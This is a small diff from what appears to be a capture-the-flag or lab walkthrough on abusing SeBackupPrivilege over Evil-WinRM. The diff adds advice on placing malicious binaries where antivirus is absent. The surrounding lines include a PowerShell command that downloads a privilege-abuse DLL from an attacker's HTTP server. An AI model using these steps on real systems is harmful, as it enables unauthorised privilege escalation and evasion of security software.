@@ -69,8 +69,8 @@ d-----         9/23/2024   9:36 AM                vmware-SYSTEM
 -a----         10/1/2024   8:18 AM          16130 vmware-vmtoolsd-SYSTEM.log
 -a----         9/23/2024  10:01 AM          51472 vmware-vmusr-administrator.log
 -a----         10/1/2024   8:18 AM          14873 vmware-vmvss-SYSTEM.log
-
 *Evil-WinRM* PS C:\windows\temp> 
+N/B: You should note that incase if there is AV this binaries will be deleted vert fast as the AV will detect them as malicious files, So you need to find the best location where the AV is absent, In my case it was 'C:\windows\Temp\'
 
 ## for a powershell U  can use the command above to upload this dll files
 ps1> Invoke-WebRequest -Uri http://10.10.14.27:8000/SeBackupPrivilegeUtils.dll -OutFile .\SeBackupPrivilegeUtils.dll
